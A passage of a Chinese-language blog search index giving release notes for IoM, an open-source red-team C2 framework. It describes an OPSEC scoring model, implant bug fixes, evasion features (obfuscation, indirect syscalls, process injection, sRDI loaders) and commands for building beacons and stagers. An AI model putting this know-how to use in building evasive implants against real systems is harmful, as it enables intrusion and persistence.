<li>\u662f\u5426\u53ef\u4ee5\u5220\u9664\u76f8\u5173\u64cd\u4f5c\u65e5\u5fd7</li> <li>\u662f\u5426\u53ef\u4ee5\u5220\u9664\u76f8\u5173\u6587\u4ef6</li> <li>...</li> </ul> <p>\u68c0\u6d4b\u53ef\u80fd\u6027</p> <ul> <li>\u73b0\u6709\u68c0\u6d4b\u673a\u5236\u662f\u5426\u6709\u53ef\u80fd\u8ffd\u8e2a</li> <li>\u5728\u64cd\u4f5c\u7cfb\u7edf\u5185\u90e8\u662f\u5426\u6709\u53ef\u80fd\u88ab\u8ffd\u8e2a</li> <li>\u5b9e\u73b0\u76f8\u5173\u68c0\u6d4b\u624b\u6bb5\u590d\u6742\u6027</li> <li>...</li> </ul> <p>\u540e\u679c</p> <ul> <li>\u64cd\u4f5c\u5931\u8d25\u53ef\u80fd\u5e26\u6765\u7684\u540e\u679c</li> <li>\u662f\u5426\u5f71\u54cd\u957f\u671f\u6f5c\u4f0f</li> <li>\u662f\u5426\u5f71\u54cd\u9a7b\u7559\u65f6\u95f4</li> <li>...</li> </ul> <p>\u7b2c\u4e00\u9636\u6bb5, \u6211\u4eec\u4f1a\u5c06\u5185\u7f6e\u7684\u6a21\u5757\u5bf9\u5e94\u5230\u8fd9\u4e2a\u8bc4\u5206\u6a21\u578b, \u7136\u540e\u5c1d\u8bd5\u5c06\u63d2\u4ef6\u5305\u4e0e OPSEC \u6a21\u578b\u7ba1\u7406.</p> <p>\u6700\u7ec8\u901a\u8fc7 OPSEC \u6a21\u578b\u4e0e ATT&amp;CK \u653b\u51fb\u77e9\u9635\u8fd8\u539f\u6574\u4e2a\u653b\u51fb\u6a21\u62df\u7684\u6d41\u7a0b.</p> <p>\u8fd9\u4e2a\u6a21\u578b\u73b0\u5728\u8fd8\u5f88\u7b80\u964b, \u6211\u4eec\u5c06\u5728\u5b9e\u6218\u4e2d\u4e0d\u65ad\u8c03\u6574.</p>"},{"location":"blog/2024/11/20/IoM_v0.0.3/#\u5176\u4ed6\u66f4\u65b0","title":"\u5176\u4ed6\u66f4\u65b0","text":""},{"location":"blog/2024/11/20/IoM_v0.0.3/#\u4fee\u590d\u5927\u91cf-implant-\u6076\u6027-bug","title":"\u4fee\u590d\u5927\u91cf implant \u6076\u6027 bug","text":"<p>\u9664\u4e86\u8fd9\u4e9b\u529f\u80fd\u6027\u66f4\u65b0, \u8fd8\u4fee\u590d\u4e86\u6781\u4e3a\u5927\u91cf\u7684 bug, \u6211\u4eec\u53d1\u73b0\u4e86\u5728 bof, CLR, execute_dll \u7b49\u7b49\u6a21\u5757\u4f1a\u5bfc\u81f4 panic \u6216\u8005\u65e0\u6cd5\u6b63\u786e\u5de5\u4f5c\u7684 bug. \u8fd9\u4e9b bug \u5728\u4f7f\u7528\u4efb\u4f55\u4e00\u6b3e rust \u7f16\u5199\u7684 C2 \u4e2d\u90fd\u4f1a\u9047\u5230. \u53ef\u4ee5\u8bf4\u76ee\u524d bug \u767e\u51fa\u7684 IoM \u5df2\u7ecf\u5bf9\u5404\u79cd\u6a21\u5757\u517c\u5bb9\u6027\u548c\u7a33\u5b9a\u6027\u6700\u597d\u7684 rustC2 \u4e86.</p> <p>\u4fee\u590d\u5404\u79cd\u5404\u6837\u7684 bug \u8017\u8d39\u4e86\u6781\u4e3a\u5927\u91cf\u7684\u7cbe\u529b, \u624d\u4f7f\u5f97\u5927\u90e8\u5206\u6a21\u5757\u80fd\u5728\u7edd\u5927\u591a\u6570\u73af\u5883\u4e2d\u8fd0\u884c. \u8981\u8fbe\u5230 Cobaltstrike \u7684\u7a33\u5b9a\u6027\u8fd8\u9700\u8981\u4e00\u4e9b\u65f6\u95f4, \u4f46\u53ef\u4ee5\u80af\u5b9a\u662f, \u6211\u4eec\u662f\u5728 Offensive Security \u8fd9\u4e2a\u9886\u57df\u4e2d, \u4f7f\u7528 rust \u8d70\u5f97\u6700\u8fdc\u7684\u56e2\u961f\u4e4b\u4e00\u4e86.</p>"},{"location":"blog/2024/11/20/IoM_v0.0.3/#\u4fee\u590d-client-tui-\u5927\u91cf-bug","title":"\u4fee\u590d client TUI \u5927\u91cf bug","text":"<p>\u76ee\u524d client \u4f7f\u7528\u7684 repl(\u4ea4\u4e92\u5f0f\u547d\u4ee4\u884c)\u5e93\u4e0e sliver \u76f8\u540c, \u8fd9\u4e2a\u5e93\u7684 bug \u5728 sliver \u4e2d\u4e5f\u6709\u975e\u5e38\u591a\u7684\u4eba\u5410\u69fd. \u66f4\u5173\u952e\u7684\u662f, windows terminal \u4e5f\u4f1a\u7ed9 client \u5e26\u6765 bug.</p> <p>\u53ef\u4ee5\u5728\u8fd9\u91cc\u770b\u5230\u5df2\u77e5 bug \u5408\u96c6, https://github.com/chainreactors/malice-network/issues/16 , \u8fd9\u4e9b bug \u6bcf\u4e00\u4e2a\u90fd\u6781\u4e3a\u5f71\u54cd\u7528\u6237\u4f53\u9a8c, \u4e5f\u56e0\u6b64\u6709\u4e0d\u5c11\u4eba\u5efa\u8bae\u4e0d\u8981\u5728 windows \u7cfb\u7edf\u4e2d\u4f7f\u7528 sliver. \u90fd\u6e90\u4e8e\u8fd9\u4e9b client \u7684\u6076\u6027 bug.</p> <p>\u5728\u53cd\u9988\u5e93\u4f5c\u8005\u6ca1\u6709\u5f97\u5230\u89e3\u51b3\u7684\u60c5\u51b5\u4e0b, \u6211\u4eec\u53c8\u82b1\u8d39\u4e86\u5927\u91cf\u7cbe\u529b\u53bb\u4fee\u590d\u8fd9\u4e9b sliver \u4e5f\u65e0\u6cd5\u89e3\u51b3\u7684 bug. \u6700\u7ec8, \u9664\u4e86 windows terminal \u5bfc\u81f4\u7684 bug, \u6211\u4eec\u4fee\u590d\u4e86\u5176\u4ed6\u6240\u6709\u7684\u5df2\u77e5\u95ee\u9898.</p>"},{"location":"blog/2024/11/20/IoM_v0.0.3/#other","title":"Other","text":"<ul> <li>\u91cd\u6784\u4e86 client \u7684\u8868\u683c, \u4f7f\u7528\u591a\u884c\u8868\u683c\u4ee3\u66ff\u8001\u7684\u8868\u683c</li> <li>\u4fee\u590d\u4e86\u591a\u4e2a cli \u6362\u884c\u5bfc\u81f4\u7684\u663e\u793a\u95ee\u9898</li> <li>\u652f\u6301\u4e86 BOF \u66f4\u591a\u7684\u8f93\u51fa\u683c\u5f0f</li> <li>\u4f18\u5316\u4e86 login \u903b\u8f91, \u5e76\u652f\u6301\u4e86\u81ea\u52a8\u91cd\u8fde\u5230 server</li> <li>\u4fee\u590d\u4e86 sliver armory \u7684\u4e00\u4e9b bug, \u91cd\u65b0\u652f\u6301\u4e86 extension</li> <li>\u4f18\u5316 sliver armory \u7684\u7d22\u5f15\u65b9\u5f0f</li> <li>\u91cd\u6784 website \u4e0e pipeline \u76f8\u5173\u7ec4\u4ef6</li> <li>\u91cd\u6784 server db \u76f8\u5173\u4ee3\u7801,  \u4f9d\u8d56\u5173\u7cfb\u53cd\u8f6c</li> <li>\u6dfb\u52a0 donut \u4e0e sliver SRDI rpc \u4e0e lua api, \u540e\u7eed\u8fd8\u4f1a\u66b4\u9732\u5230 client \u7684 cmd \u4e2d</li> <li>\u4f18\u5316<code>!</code> \u547d\u4ee4, \u73b0\u5728\u80fd\u4ece PATH \u4e2d\u5bfb\u627e\u7a0b\u5e8f</li> <li>\u5b9e\u88c5\u4e86 encryption \u4e0e tls \u76f8\u5173\u53c2\u6570</li> <li>\u4fee\u590d lua \u76f8\u5173\u5927\u91cf bug</li> <li>......</li> </ul>"},{"location":"blog/2024/11/20/IoM_v0.0.3/#\u672a\u89e3\u51b3\u7684\u95ee\u9898","title":"\u672a\u89e3\u51b3\u7684\u95ee\u9898","text":"<p>\u5728 v0.0.3 \u4e2d\u8fd8\u6709\u4e00\u4e9b\u9057\u61be.</p> <ol> <li>\u56e0\u4e3a rust \u7684 MSVC target \u5bf9 TLS \u7684\u7279\u6b8a\u4f18\u5316, \u5bfc\u81f4\u4f7f\u7528 MSVC \u7f16\u8bd1\u7684\u4e8c\u8fdb\u5236\u6587\u4ef6\u65e0\u6cd5\u88ab SRDI \u8f6c\u4e3a shellcode.</li> <li>\u4f7f\u7528 windows GNU target \u7f16\u8bd1\u7684\u4ea7\u7269\u6682\u65f6\u65e0\u6cd5\u5728 win7 \u4e0a\u8fd0\u884c</li> </ol> <p>\u6211\u4eec\u5df2\u7ecf\u6709\u4e86\u4e00\u4e9b\u7709\u76ee\u53bb\u89e3\u51b3\u8fd9\u4e24\u4e2a\u95ee\u9898, \u4f46\u662f\u5728\u8fd9\u4e2a\u7248\u672c\u6765\u4e0d\u53ca\u5b9e\u73b0. \u5982\u679c\u9047\u5230\u4e86\u8fd9\u4e24\u4e2a bug, \u6b22\u8fce\u63d0\u4f9b issue, \u6211\u4eec\u4f1a\u5c3d\u53ef\u80fd\u63d0\u4f9b\u4ee3\u66ff\u65b9\u6848.</p>"},{"location":"blog/2024/11/20/IoM_v0.0.3/#\u672a\u6765\u8def\u7ebf","title":"\u672a\u6765\u8def\u7ebf","text":"<p>\u73b0\u5728\u7684 IoM \u4e0d\u8bba\u662f\u5728\u529f\u80fd\u8986\u76d6\u9762; \u8fd8\u662f OPSEC; \u8fd8\u662f\u53ef\u62d3\u5c55\u6027\u4e0a\u90fd\u5df2\u7ecf\u8d85\u8fc7\u4e86\u4efb\u610f\u4e00\u6b3e\u5f00\u6e90 C2.</p> <p>\u800c\u8981\u771f\u6b63\u610f\u601d\u4e0a\u582a\u6bd4 Cobaltstrike \u7684\u7ea2\u961f\u57fa\u7840\u8bbe\u65bd, \u8981\u8d70\u7684\u8def\u8fd8\u5f88\u957f.</p> <p>\u6700\u5927\u7684\u95ee\u9898\u5c31\u662f\u529f\u80fd\u62d3\u5c55\u8fc7\u4e8e\u8fc5\u901f, \u5bfc\u81f4\u7684 bug/\u7528\u6237\u4f53\u9a8c\u95ee\u9898. IoM \u6781\u5176\u7f3a\u5c11\u5b9e\u6218\u7684\u6253\u78e8, \u6211\u4eec\u6b22\u8fce\u5728\u5b9e\u6218\u4e2d\u4f7f\u7528 IoM, \u5e76\u8ba1\u5212\u514d\u8d39\u4e3a\u5408\u6cd5\u7528\u9014\u7684\u7ea2\u84dd\u5bf9\u6297/HW \u7684\u4f7f\u7528\u8005\u63d0\u4f9b\u6280\u672f\u89e3\u91ca\u4e0e\u6280\u672f\u652f\u6301.</p> <p>\u4e0b\u4e00\u9636\u6bb5\u7684\u5de5\u4f5c\u91cd\u70b9\u5c06\u662f GUI \u4e0e\u6587\u6863.</p> <p>\u5728\u5177\u4f53\u529f\u80fd\u4e0a, \u6211\u4eec\u901a\u8fc7\u4e09\u4e2a\u7248\u672c\u7684\u5feb\u901f\u8fed\u4ee3, \u5df2\u7ecf\u5b9e\u73b0\u4e86\u6700\u521d\u8ba1\u5212\u7684\u81f3\u5c11 80%, \u6211\u4eec\u5c06\u5728 IoM \u7684\u6a2a\u5411\u4e0e\u7eb5\u5411\u7ee7\u7eed\u62d3\u5c55\u80fd\u529b, \u5c06\u8bbe\u8ba1\u84dd\u56fe\u4e2d\u7684 LLVM obfuscator, rem \u4ee3\u7406\u5de5\u5177, linux-kit, mac-kit \u7b49\u9010\u4e00\u5b9e\u73b0.</p> <p>\u5411\u7740\u6210\u4e3a **\u5f00\u653e\u7684\u7ea2\u961f\u57fa\u7840\u8bbe\u65bd**\u7684\u76ee\u6807\u8fc8\u8fdb.</p> <p>\u8be6\u7ec6\u7684\u8def\u7ebf\u56fe\u53ef\u53c2\u9605: https://chainreactors.github.io/wiki/IoM/roadmap/</p> <p>\u672c\u6b21\u66f4\u65b0\u5185\u5bb9\u591a\u5230\u6ca1\u529e\u6cd5\u901a\u8fc7\u4e00\u4e2a\u66f4\u65b0\u65e5\u5fd7\u8fdb\u884c\u63cf\u8ff0, \u540e\u7eed\u8fd8\u4f1a\u6709\u4e00\u7cfb\u5217\u6587\u6863\u5bf9 IoM \u7684\u65b9\u65b9\u9762\u9762\u8fdb\u884c\u7cfb\u7edf\u4ecb\u7ecd.</p>"},{"location":"blog/2024/11/20/IoM_v0.0.3/#end","title":"End","text":"<p>\u6211\u4eec\u8ba1\u5212\u7ed9\u6709 **\u7ea2\u961f\u84dd\u519b\u5efa\u8bbe\u8ba1\u5212**\u7684\u4f01\u4e1a\u63d0\u4f9b\u7cfb\u7edf\u5316\u7684\u57fa\u7840\u8bbe\u65bd\u4e0e\u6280\u672f\u652f\u6491.</p> <p>\u6b22\u8fce\u6709\u7c7b\u4f3c\u9700\u6c42\u7684\u670b\u53cb\u4e0e\u6211\u4eec\u8054\u7cfb. \u6211\u4eec\u662f\u4e00\u4e2a\u5f00\u653e\u7684\u57fa\u7840\u8bbe\u65bd. \u5c31\u7b97\u6ca1\u6709\u8ba1\u5212\u652f\u6301\u6211\u4eec\u7684\u4ea7\u54c1, \u6211\u4eec\u4e5f\u4f1a\u4e3a\u4efb\u4f55\u5173\u6ce8 IoM \u7684\u4f7f\u7528\u8005\u63d0\u4f9b\u4e00\u5b9a\u7a0b\u5ea6\u7684\u652f\u6301.</p>"},{"location":"blog/2025/01/02/IoM_v0.0.4/","title":"IoM v0.0.4 Bootstrapping","text":""},{"location":"blog/2025/01/02/IoM_v0.0.4/#intro","title":"Intro","text":"<p>IoM\u901a\u8fc7\u51e0\u4e2a\u6708\u7684\u5feb\u901f\u8fed\u4ee3, \u5df2\u7ecf\u5177\u5907\u4e86\u4e00\u4e2a\u73b0\u4ee3\u5316C2\u7684\u7edd\u5927\u90e8\u5206\u529f\u80fd. </p> <p>v0.0.4\u5c06\u662fv0.1.0\u4e4b\u524d\u7684\u6700\u540e\u4e00\u4e2a\u7248\u672c\uff0c \u53ef\u4ee5\u5728\u8fd9\u91cc\u770b\u5230\u6211\u4eecv0.1.0\u7684\u8def\u7ebf\u56fe: https://chainreactors.github.io/wiki/IoM/roadmap/#v010-professional-release</p> <p>\u5e7f\u544a\u65f6\u95f4: </p> <p>\u5728\u8fd9\u51e0\u4e2a\u6708\u7684\u5f00\u53d1\u5386\u7a0b\u4e2d\uff0c\u6211\u4eec\u79ef\u7d2f\u4e86\u8db3\u591f\u591a\u7684\u72ec\u4e00\u65e0\u4e8c\u7684\u529f\u80fd\u3002 \u4ecev0.1.0 \u5f00\u59cb\uff0c \u6211\u4eec\u5c06\u5c1d\u8bd5\u53d1\u5e03professional\u3002</p> <p>profressinal\u989d\u5916\u652f\u6301\u7684\u529f\u80fd:</p> <ul> <li>\u57fa\u4e8e\u72ec\u7279\u7684ollvm \u80fd\u5bf9malefic\u7684\u6240\u6709\u7f16\u8bd1\u4ea7\u7269\u8fdb\u884c\u9ad8\u5ea6\u6df7\u6dc6</li> <li>\u53ef\u81ea\u5b9a\u4e49\u53ef\u7ec4\u88c5\u7684loader</li> <li>\u72ec\u7279\u7684pe loader\u4e0esRDI, \u80fd\u5b9e\u73b0\u65e0\u65b0\u8fdb\u7a0b\u6267\u884ccmd/wmic\u7b49\u4efb\u610f\u547d\u4ee4\uff0c \u6216loader\u8fdc\u7a0b\u4e8c\u8fdb\u5236\u6587\u4ef6</li> <li>linux kit</li> <li>\u57fa\u4e8erem\u5b9e\u73b0\u7684\u4efb\u610f\u4fe1\u9053\u7684\u6d41\u91cf, \u4ee3\u7406\u529f\u80fd</li> <li>OPSEC</li> <li>\u72ec\u7acb\u7684\u5806\u52a0\u5bc6</li> <li>\u72ec\u7acb\u7684\u5806\u6808\u6df7\u6dc6</li> <li>\u72ec\u7acb\u7684indirect-syscall</li> <li>\u53ef\u81ea\u5b9a\u4e49\u7684\u8fdb\u7a0b\u6ce8\u5165</li> <li>......</li> </ul> <p>professional \u5c06\u63d0\u4f9b\u4ece\u9759\u6001\u3001\u884c\u4e3a\u3001\u5185\u5b58\u3001\u6d41\u91cf\u573a\u666f\u7684\u89e3\u51b3\u65b9\u6848</p>"},{"location":"blog/2025/01/02/IoM_v0.0.4/#v004-\u66f4\u65b0\u65e5\u5fd7","title":"v0.0.4  \u66f4\u65b0\u65e5\u5fd7","text":"<p>v0.0.4 \u662f\u4e00\u4e2a\u8fc7\u5ea6\u7248\u672c\uff0c\u5927\u90e8\u5206\u66f4\u65b0\u90fd\u5728\u4fee\u590dbug\uff0c \u63d0\u9ad8\u517c\u5bb9\u6027\u7a33\u5b9a\u6027\uff0c \u964d\u4f4e\u4f7f\u7528\u96be\u5ea6\u4e0e\u7b80\u5316\u64cd\u4f5c\u4e0a\u3002 </p>"},{"location":"blog/2025/01/02/IoM_v0.0.4/#implant\u66f4\u65b0","title":"implant\u66f4\u65b0","text":""},{"location":"blog/2025/01/02/IoM_v0.0.4/#\u517c\u5bb9win7windows-2008","title":"\u517c\u5bb9win7/windows 2008","text":"<p>\u65b0\u7248\u7684rust\u653e\u5f03\u4e86\u5bf9windows7/windows server 2008\u7684\u652f\u6301\u3002 \u4e3a\u4e86\u517c\u5bb9win7\uff0c\u6211\u4eec\u8c03\u6574\u4e86\u7f16\u8bd1\u73af\u5883\u7684\u7248\u672c\uff0c \u4f7f\u75281.74 rust + lto \u94fe\u63a5\uff0c \u4f7f\u5f97v0.0.4\u7684implant\u80fd\u8fd0\u884c\u5728\u4f4e\u7248\u672c\u7684windows\u4e2d\u3002 </p> <p>\u91cd\u8f7d\u4e86\u94fe\u63a5\u8fc7\u7a0b\uff0c\u89e3\u51b3rust lto\u65e0\u6cd5\u6b63\u786e\u52a0\u8f7d\u7b26\u53f7\u8868\u7684bug: https://github.com/rust-lang/rust/issues/44322 </p>"},{"location":"blog/2025/01/02/IoM_v0.0.4/#\u4fee\u590dsrdi-\u9759\u6001-tls-\u65e0\u6cd5\u52a0\u8f7d\u7684\u95ee\u9898","title":"\u4fee\u590dsRDI \u9759\u6001 TLS \u65e0\u6cd5\u52a0\u8f7d\u7684\u95ee\u9898","text":"<p>\u89e3\u51b3\u4e86PE loader \u65e0\u6cd5\u52a0\u8f7d\u5b58\u5728\u9759\u6001 <code>TLS</code>\u7684PE\u6587\u4ef6\uff0c \u5bfc\u81f4\u4ee5 <code>Rust</code> \u7f16\u5199\u7684\u7a0b\u5e8f\u52a0\u8f7dpanic\u95ee\u9898\u3002 </p> <p>\u76ee\u524d\u8fd8\u6ca1\u6709\u89e3\u51b3\u4e86\u8fd9\u4e2a\u95ee\u9898\u7684sRDI\uff0c \u4e3a\u6b64\u6211\u4eec\u5b9e\u73b0\u4e86\u81ea\u5df1\u7684sRDI\u5e76\u66ff\u6362\u4e86\u539f\u6709\u7684link sRDI</p> <pre><code>.\\malefic-mutant.exe build srdi -i .\\malefic.exe\n</code></pre> <p></p> <p>(\u5728v0.0.4\u53d1\u5e03\u4e4b\u65f6\uff0c\u6211\u4eec\u540c\u6b65\u5f00\u542f\u4e86\u786c\u6838\u7684\u7cfb\u5217\u6280\u672f\u6587\u7ae0\u5206\u4eab\uff0c \u5c06\u5206\u4eab\u4e00\u4e9b\u5c1a\u672a\u6709\u4eba\u89e3\u51b3\u8fc7\u7684\u95ee\u9898)</p>"},{"location":"blog/2025/01/02/IoM_v0.0.4/#dllspawn","title":"dllspawn","text":"<p>\u7531\u4e8e\u8fd8\u6709\u5f88\u591a\u8d44\u6e90\u505c\u7559\u5728 <code>CS</code> \u7684\u5404\u7c7b\u5e93\u4e2d\uff0c \u56e0\u6b64\uff0c \u6211\u4eec\u63d0\u4f9b\u4e86 <code>dllspanw</code> \u6765\u9002\u914d <code>CS</code> \u7684\u5bf9\u5e94\u529f\u80fd</p> <p>CS\u4e2d\u5404\u79cd\u63d0\u6743\u7684dll\u4ee5\u53ca\u5404\u79cd\u529f\u80fd\uff0c \u7edd\u5927\u90e8\u5206\u90fd\u57fa\u4e8e\u6b64\u5b9e\u73b0\uff0c \u73b0\u5728\u6211\u4eec\u80fd\u5b8c\u7f8e\u7684\u517c\u5bb9CS\u7684dll\u76f8\u5173\u547d\u4ee4\u4e86</p> <p></p>"},{"location":"blog/2025/01/02/IoM_v0.0.4/#http-pulse","title":"http pulse","text":"<p>\u5728v0.0.3 \u4e2d\uff0c \u652f\u6301\u4e86\u57fa\u4e8etcp\u534f\u8bae\u7684stager\uff0c\u4f46\u662f\u56e0\u4e3a\u9759\u6001TLS\u9501\u7684\u95ee\u9898\uff0c \u73b0\u6709\u7684\u6240\u6709sRDI\u6216PE loader (donut, pe2shellcode, No-Consolation\u7b49\u7b49)\u90fd\u65e0\u6cd5\u52a0\u8f7drust MSVC\u7f16\u8bd1\u7684\u7a0b\u5e8f\u3002\u53c8\u56e0\u4e3aGNU\u7684win7\u517c\u5bb9\u6027\u95ee\u9898\uff0c pulse\u4e8b\u5b9e\u4e0a\u53ea\u662f\u4e00\u4e2a\u6446\u8bbe\u3002</p> <p>\u73b0\u5728\u6211\u4eec\u540c\u65f6\u89e3\u51b3\u4e86win7\u517c\u5bb9\u6027\u4e0e\u9759\u6001TLS\u9501\u7684\u95ee\u9898\u3002\u5e76\u65b0\u589e\u4e86pulse\u7684http\u5b9e\u73b0\uff0c\u73b0\u5728pulse\u53ef\u4ee5\u771f\u6b63\u53d1\u6325stager\u7684\u4f5c\u7528\u4e86\u3002</p>"},{"location":"blog/2025/01/02/IoM_v0.0.4/#\u81ea\u52a8\u5316\u7f16\u8bd1","title":"\u81ea\u52a8\u5316\u7f16\u8bd1","text":"<p>\u5728\u521a\u53d1\u5e03\u7684v0.0.3\u4e2d, \u6211\u4eec\u4f7f\u7528docker\u4f5c\u4e3a\u81ea\u52a8\u5316\u7f16\u8bd1\u7684\u89e3\u51b3\u65b9\u6848\u3002 \u4f46\u662frust\u590d\u6742\u7684\u7f16\u8bd1\u65b9\u6848\u4e0d\u5f97\u4e0d\u51c6\u5907\u6bcf\u4e2atarget\u5bf9\u5e94\u7684\u7f16\u8bd1\u73af\u5883\u3002\u8fd9\u5bfc\u81f4\u4e86\u5bf9CPU, \u5185\u5b58\uff0c\u786c\u76d8\u90fd\u6709\u5de8\u5927\u7684\u5360\u7528\uff0c \u5e76\u4e14\u6211\u4eec\u76ee\u524d\u53ea\u5b9e\u73b0\u4e86\u57fa\u4e8elinux\u7684\u81ea\u52a8\u5316\u5b89\u88c5\u3002 </p> <p>\u6bd4\u8d77sliver\u6216\u8005CobaltStrike\u8fc7\u4e8e\u7b28\u91cd, \u8fd9\u5bfc\u81f4\u4e0a\u624b\u95e8\u69db\u6781\u5927\u63d0\u9ad8\u3002\u4e3a\u6b64\uff0c \u6211\u4eec\u51c6\u5907\u4e86\u66f4\u52a0\u8f7b\u91cf\u7684\u89e3\u51b3\u65b9\u6848\u3002 </p> <p>\u5728v0.0.2\u4e2d\uff0c \u63d0\u4f9b\u4e86\u4f7f\u7528\u4e24\u884cgh\u547d\u4ee4\u5b9e\u73b0\u7684\u81ea\u52a8\u5316\u7f16\u8bd1\uff0c \u5728v0.0.4\u4e2d\uff0c\u6211\u4eec\u5c06github action\u7684\u4e91\u7f16\u8bd1\u63a5\u5165\u5230client/server\u4e2d\uff0c \u53ea\u9700\u8981\u7533\u8bf7\u4e00\u4e2agithub token\uff0c \u5373\u53ef\u5b9e\u73b0\u5bf9client/server\u65e0\u4efb\u4f55\u73af\u5883\u8981\u6c42\u7684\u81ea\u52a8\u5316\u7f16\u8bd1\u3002</p> <p>v0.0.4\u652f\u6301\u65e0\u4efb\u4f55\u672c\u5730\u73af\u5883\u7684\u81ea\u52a8\u5316\u7f16\u8bd1\u4e86\uff0c \u6781\u5927\u51cf\u8f7b\u4e86malefic\u7f16\u8bd1\u7684\u5fc3\u667a\u8d1f\u62c5</p>"},{"location":"blog/2025/01/02/IoM_v0.0.4/#\u57fa\u4e8egithub-action\u7684\u5feb\u901f\u7f16\u8bd1","title":"\u57fa\u4e8egithub action\u7684\u5feb\u901f\u7f16\u8bd1","text":"<p>github\u76f8\u5173\u914d\u7f6e</p> <p>\u4f7f\u7528github action\u524d\uff0c\u9700\u8981\u5148\u5728server\u6240\u5904\u670d\u52a1\u5668\u4e0a\u5bf9server\u4e8c\u8fdb\u5236\u6587\u4ef6\u540c\u4e00\u76ee\u5f55\u4e0b\u7684config.yaml\u8fdb\u884c\u914d\u7f6e\u3002\u5c06malefic\u6e90\u7801\u6240\u5728\u7684github\u4ed3\u5e93\u540d\u3001github\u7528\u6237\u540dgithub token\u4ee5\u53caworkflow\u914d\u7f6e\u6587\u4ef6\u540d\u586b\u5165\u3002</p> <pre><code>...\n  github:\n    repo:                           # malefic\u7684\u4ed3\u5e93\u540d\n    owner:                          # github\u7528\u6237\u540d \n    token:                          # github\u7684token\n    workflow:                       # workflow\u7684\u914d\u7f6e\u6587\u4ef6\u540d\uff08\u9ed8\u8ba4\u4e3agenerate.yaml\uff09\n</code></pre> <p>\u82e5\u6709\u591a\u4e2a\u7528\u6237\u4f7f\u7528\u670d\u52a1\u5668\uff0c\u4e5f\u53ef\u4ee5\u5728client\u6240\u5904\u4e3b\u673a\u7684~/.config/malice/malice.yaml\u4e0b\u8fdb\u884c\u914d\u7f6e\u3002\u5f53client\u7aef\u7684github \u914d\u7f6e\u586b\u5165\u4e4b\u540e\uff0cserver\u4f1a\u4f18\u5148\u4f7f\u7528client\u63d0\u4f9b\u7684github\u914d\u7f6e\uff0c\u6765\u542f\u52a8\u5de5\u4f5c\u6d41\u3002</p> <pre><code>...\n    github_repo:                           # malefic\u7684\u4ed3\u5e93\u540d\n    github_owner:                          # github\u7528\u6237\u540d \n    github_token:                          # github\u7684token \n    github_workflow_file:                  # workflow\u7684\u914d\u7f6e\u6587\u4ef6\u540d\uff08\u9ed8\u8ba4\u4e3agenerate.yaml\uff09\n</code></pre> <p>action build</p> <p>\u4f7f\u7528action\u548c\u5b50\u547d\u4ee4\u6765\u8fdb\u884c\u7f16\u8bd1\uff0c\u5fc5\u987b\u6307\u5b9abuild target\u4ee5\u53ca\u5bf9\u5e94\u7684profile\u3002\u5f53workflow\u8fd0\u884c\u6210\u529f\u65f6\uff0cclient\u4f1a\u63d0\u793a\u5f53\u524dworkflow\u7684html_url\uff0c\u65b9\u4fbf\u5728\u7f51\u9875\u7aef\u8fdb\u884c\u67e5\u770b\u3002\u5f53\u7f16\u8bd1\u5b8c\u6210\u65f6\uff0c\u4e5f\u4f1a\u5728client\u8fdb\u884c\u901a\u77e5\u3002</p> <p></p> <p>\u547d\u4ee4\u793a\u4f8b\uff1a</p> <pre><code>action beacon --profile test --target x86_64-pc-windows-msvc\n</code></pre> <p>\u4e3a\u4e86\u7edf\u4e00\u4f7f\u7528\uff0caction run\u7684\u53c2\u6570\u547d\u4ee4\u4e0edocker build\u7684\u53c2\u6570\u57fa\u672c\u4e00\u81f4\u3002</p>"},{"location":"blog/2025/01/02/IoM_v0.0.4/#docker\u4f18\u5316","title":"docker\u4f18\u5316","text":"<p>\u6dfb\u52a0\u4e86\u670d\u52a1\u5668\u7aef\u7684docker\u7f16\u8bd1\u961f\u5217\uff0c\u56e0\u4e3arust\u7aef\u5bf9\u6027\u80fd\u5360\u7528\u8f83\u5927\uff0c \u7f16\u8bd1\u65f6\u4f1a\u5360\u7528\u6240\u6709\u7684CPU\u3002\u73b0\u5728\u6dfb\u52a0\u4e86\u7f16\u8bd1\u961f\u5217\uff0c \u540c\u65f6\u53ea\u4f1a\u8fd0\u884c\u4e00\u4e2a\u7f16\u8bd1\u4efb\u52a1\u3002 </p> <p>\u6781\u5927\u51cf\u5c11\u4e86install.sh\u5b89\u88c5\u65f6\u7684\u914d\u7f6e, \u73b0\u5728\u53ea\u4f1a\u4e0b\u8f7d\u4e00\u4e2aallinone\u7684\u955c\u50cf. \u8fd9\u4e2a\u955c\u50cf\u5141\u8bb8\u9664\u4e86arm\u67b6\u6784\u4ee5\u53cawin MSVC\u4e4b\u5916\u7684\u6240\u6709\u67b6\u6784\u7f16\u8bd1\u3002 </p> <p>\u539f\u672c\u7684install.sh \u4f1a\u4e0b\u8f7d\u7ea613g\u7684\u955c\u50cf\uff0c \u7136\u540e\u751f\u6210\u51e0\u4e2ag\u7684\u7f16\u8bd1\u4e2d\u95f4\u6587\u4ef6\u3002\u73b0\u5728\u6211\u4eec\u5927\u5927\u7b80\u5316\u4e86\u5bf9\u670d\u52a1\u5668\u7684\u8d1f\u62c5\uff0c \u63d0\u4f9b\u4e86\u65b0\u7684allinone\u7684\u7f16\u8bd1\u955c\u50cf\u4ee5\u53ca\u7b80\u5316\u5b89\u88c5\u811a\u672c\u3002 </p> <p>allinone \u955c\u50cf: ghcr.io/chainreactors/malefic-builder:v0.0.4</p> <p>\u8fd9\u4e2a\u955c\u50cf\u89e3\u51b3\u4e86\u5927\u91cf\u7684rust\u7684\u73af\u5883\u5b89\u88c5\uff0c\u4ea4\u53c9\u7f16\u8bd1\u7b49\u95ee\u9898\u3002\u5982\u679c\u6709\u5176\u4ed6rust\u9879\u76ee\u5728\u7f16\u8bd1\u4e0a\u9047\u5230\u5404\u79cd\u9519\u8bef\uff0c \u4e0d\u59a8\u4f7f\u7528\u8fd9\u4e2a\u8bd5\u8bd5\u3002 </p>"},{"location":"blog/2025/01/02/IoM_v0.0.4/#client\u66f4\u65b0","title":"client\u66f4\u65b0","text":""},{"location":"blog/2025/01/02/IoM_v0.0.4/#artifact\u529f\u80fd\u7ec4","title":"artifact\u529f\u80fd\u7ec4","text":"<p>\u4e3a\u4e86\u5728\u63d0\u6743\u811a\u672c\u4e2d\u66f4\u65b9\u4fbf\u4f7f\u7528IoM, \u5c31\u50cfCS\u80fd\u76f4\u63a5\u901a\u8fc7listener\u751f\u6210\u5bf9\u5e94\u7684shellcode\u4e00\u6837. patch2\u5c06\u4e00\u7cfb\u5217shellcode\u4e0eartifact\u64cd\u4f5c\u7684\u51fd\u6570\u66b4\u9732\u51fa\u6765\u4e86\u3002</p> 